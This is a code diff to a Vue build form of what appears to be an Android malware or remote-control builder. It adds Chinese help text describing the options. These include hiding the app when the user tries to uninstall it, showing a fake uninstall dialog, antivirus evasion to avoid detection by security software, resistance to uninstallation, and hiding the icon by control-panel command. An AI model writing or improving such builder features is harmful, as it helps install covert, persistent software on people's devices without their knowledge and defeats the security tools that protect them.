@@ -532,11 +532,17 @@ const validateForm = (): boolean => {
                                     <NGridItem>
                                         <NFormItem label="隐藏方式">
                                             <NSelect v-model:value="form.hide_type" :options="hideTypeOptions" />
+                                            <div class="field-desc">
+                                                直接隐藏：检测到卸载时按HOME键跳走；卸载隐藏：不拦截卸载流程，需配合防止卸载使用；提示卸载：弹出假卸载对话框
+                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
                                         <NFormItem label="免杀保护">
                                             <NSelect v-model:value="form.notify_msg" :options="antkillOptions" />
+                                            <div class="field-desc">
+                                                开启后降低被系统安全软件检测和查杀的概率
+                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                 </NGrid>
@@ -550,6 +556,9 @@ const validateForm = (): boolean => {
                                     <NGridItem>
                                         <NFormItem label="防止卸载">
                                             <NSelect v-model:value="form.use_antkill" :options="switchOptions" />
+                                            <div class="field-desc">
+                                                赋予防卸载能力，运行时通过控制面板 kb 命令控制开关
+                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
@@ -560,6 +569,9 @@ const validateForm = (): boolean => {
                                     <NGridItem>
                                         <NFormItem label="隐藏应用">
                                             <NSelect v-model:value="form.hidden_app" :options="switchOptions" />
+                                            <div class="field-desc">
+                                                安装后图标默认显示，需通过控制面板发送隐藏图标命令隐藏
+                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
@@ -1103,5 +1115,12 @@ const validateForm = (): boolean => {
 
 .build-modal-footer {
     padding: 16px 24px 24px;
+}
+
+.field-desc {
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 4px;
+    line-height: 1.4;
 }
 </style>
